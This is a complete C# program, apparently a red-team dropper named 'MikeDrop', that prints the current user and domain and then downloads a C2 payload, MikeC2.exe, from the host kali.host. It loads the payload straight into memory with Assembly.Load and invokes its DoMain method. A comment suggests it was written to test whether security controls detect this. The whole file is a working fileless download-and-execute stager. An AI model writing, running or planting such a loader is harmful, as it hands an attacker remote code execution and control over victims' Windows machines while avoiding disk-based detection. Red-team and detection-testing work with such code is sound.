using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net;
using System.IO;

using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.DirectoryServices.ActiveDirectory;

namespace MikeDrop
{
    class Program
    {
        static void Main(string[] args)
        {
            DoMikeC2();
        }

        public static void DoMikeC2()
        {
            // Do a little enumeration
            // These variables can be used to target execution to a specific network and/or user
            Console.WriteLine("UserName: {0}", Environment.UserName);
            Console.WriteLine("Domain UserName: {0}", Environment.UserDomainName);

            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            // Not obfuscated or subtle, but are your controls able to detect this?
            var a = Assembly.Load(wc.DownloadData("http://kali.host/MikeC2.exe"));

            var t = a.GetType("MikeC2.Program");
            var c = Activator.CreateInstance(t);
            var m = t.GetMethod("DoMain");
            m.Invoke(c, null);
        }




    }
}
